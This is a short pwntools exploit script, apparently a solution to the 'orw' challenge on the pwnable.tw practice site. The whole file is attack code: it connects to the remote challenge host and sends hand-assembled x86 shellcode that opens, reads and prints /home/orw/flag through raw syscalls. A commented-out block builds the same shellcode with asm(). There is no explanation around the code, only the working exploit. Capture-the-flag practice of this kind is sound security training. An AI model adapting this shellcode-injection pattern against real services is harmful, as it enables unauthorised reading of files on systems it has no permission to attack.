from pwn import *

shellcode = "\x31\xc9\xb8\x05\x00\x00\x00\x51\x68\x66\x6c\x61\x67\x68\x6f\x72\x77\x2f\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f\x68\x89\xe3\x31\xd2\xcd\x80\xb8\x03\x00\x00\x00\x89\xd9\xbb\x03\x00\x00\x00\xb2\x30\xcd\x80\xb8\x04\x00\x00\x00\xb3\x01\xcd\x80"
#p = process("./orw")
p = remote('chall.pwnable.tw', 10001)

'''
open_syscall = asm('mov eax, 5; mov ebx, 0x804a095; mov ecx, 0; int 0x80')
read_syscall = asm('mov ebx, eax; mov eax, 3; mov ecx, 0x804a0c0; mov edx, 0x100; int 0x80')
write_syscall = asm('mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80')
file_name = '/home/orw/flag'
terminate = '\x00'

shellcode = open_syscall+read_syscall+write_syscall+file_name+terminate
'''
start = p.recv(30)
print start
#gdb.attach(p)
p.send(shellcode)
print "sending shellcode"
data = p.recvline()
print data
